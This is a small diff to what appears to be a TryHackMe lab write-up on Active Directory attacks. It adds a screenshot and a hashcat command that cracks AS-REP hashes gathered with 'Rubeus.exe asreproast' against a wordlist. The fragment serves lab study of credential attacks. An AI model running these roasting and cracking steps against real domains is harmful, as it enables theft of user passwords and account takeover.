@@ -64,4 +64,9 @@ Navigate to the folder where rubeus is located
 
 `Rubeus.exe asreproast`
 
+![image](https://user-images.githubusercontent.com/16500435/103442123-b05fd880-4c53-11eb-9bcd-74c375b1e6a2.png)
+
+
 we use `hashcat` to crack this hashes
+
+`root@kali:~/Desktop/thm# hashcat -m 18200 hash.txt pass.txt`
